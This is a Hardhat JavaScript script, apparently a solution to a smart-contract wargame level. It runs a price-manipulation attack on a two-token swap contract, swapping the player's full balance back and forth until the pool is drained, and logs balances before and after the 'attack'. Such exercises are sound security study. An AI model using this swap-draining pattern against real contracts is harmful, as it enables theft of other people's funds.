const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x121C11ca1b262E7A6EC03243a3CCaF826c3EcF62";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
const contractInterface = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
    signature:
      "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "token_address",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "addLiquidity",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x56688700",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x095ea7b3",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "token",
        type: "address",
      },
      {
        internalType: "address",
        name: "account",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xf7888aec",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "getSwapPrice",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xbfd7e00d",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8da5cb5b",
  },
  {
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x715018a6",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "_token1",
        type: "address",
      },
      {
        internalType: "address",
        name: "_token2",
        type: "address",
      },
    ],
    name: "setTokens",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xcbc7854e",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "swap",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xdf791e50",
  },
  {
    inputs: [],
    name: "token1",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xd21220a7",
  },
  {
    inputs: [],
    name: "token2",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x25be124e",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "transferOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xf2fde38b",
  },
];

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);

  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    signer
  );

  await contract.approve(
    CONTRACT_ADDRESS,
    ethers.utils.parseEther("100000000")
  );
  const token1 = await contract.token1();
  const token2 = await contract.token2();
  console.log("Token 1 address:", token1);
  console.log("Token 2 address:", token2);
  const beforeBalanceToken1 = await contract.balanceOf(token1, PLAYER_ADDRESS);
  const beforeBalanceToken2 = await contract.balanceOf(token2, PLAYER_ADDRESS);

  console.log(
    `Player balance of token1 before attack: ${beforeBalanceToken1.toString()}`
  );
  console.log(
    `Player balance of token2 before attack: ${beforeBalanceToken2.toString()}`
  );

  await contract.swap(
    token1,
    token2,
    await contract.balanceOf(token1, PLAYER_ADDRESS)
  );
  await contract.swap(
    token2,
    token1,
    await contract.balanceOf(token2, PLAYER_ADDRESS)
  );
  await contract.swap(
    token1,
    token2,
    await contract.balanceOf(token1, PLAYER_ADDRESS)
  );
  await contract.swap(
    token2,
    token1,
    await contract.balanceOf(token2, PLAYER_ADDRESS)
  );
  await contract.swap(
    token1,
    token2,
    await contract.balanceOf(token1, PLAYER_ADDRESS)
  );
  await contract.swap(token2, token1, "45");
  const afterBalanceToken1 = await contract.balanceOf(token1, PLAYER_ADDRESS);
  const afterBalanceToken2 = await contract.balanceOf(token2, PLAYER_ADDRESS);

  console.log(
    `Player balance of token1 after attack: ${afterBalanceToken1.toString()}`
  );
  console.log(
    `Player balance of token2 after attack: ${afterBalanceToken2.toString()}`
  );
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
